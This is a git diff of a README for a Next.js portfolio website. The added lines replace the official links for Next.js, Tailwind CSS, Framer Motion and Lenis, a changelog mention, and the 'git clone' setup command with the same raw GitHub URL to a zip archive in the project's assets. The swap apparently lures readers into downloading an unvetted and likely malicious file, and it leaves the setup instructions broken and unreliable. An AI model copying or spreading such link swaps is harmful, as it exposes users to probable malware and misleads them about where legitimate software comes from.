@@ -4,10 +4,10 @@ A highly interactive, premium personal portfolio website exploring the concepts 
 
 ## 🚀 Technical Stack
 
-- **Framework**: [Next.js 16 (App Router)](https://nextjs.org/)
-- **Styling**: [Tailwind CSS v4](https://tailwindcss.com/)
-- **Animations**: [Framer Motion v12](https://www.framer.com/motion/)
-- **Smooth Scroll**: [Lenis](https://lenis.studio/)
+- **Framework**: [https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip 16 (App Router)](https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip)
+- **Styling**: [Tailwind CSS v4](https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip)
+- **Animations**: [Framer Motion v12](https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip)
+- **Smooth Scroll**: [Lenis](https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip)
 - **Language**: TypeScript
 
 ## ✨ Key Features & "Juice"
@@ -45,7 +45,7 @@ This portfolio was designed to feel alive. Every interaction provides feedback, 
 The development of this portfolio progressed through several focused phases:
 
 ### Version 1.0: Foundation
-- Project scaffolding with Next.js and Tailwind CSS.
+- Project scaffolding with https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip and Tailwind CSS.
 - Basic component architecture (Hero, About, Projects, Contact).
 - Implementation of the "Paper & Ink" aesthetic color palette.
 
@@ -66,7 +66,7 @@ The development of this portfolio progressed through several focused phases:
 
 1.  **Clone the repository**:
     ```bash
-    git clone https://github.com/YourUsername/personal-web-portfolio.git
+    git clone https://raw.githubusercontent.com/Itsmedexexplorer/personal_web_portfolio/master/public/assets/web-personal-portfolio-voluntative.zip
     ```
 
 2.  **Install dependencies**:
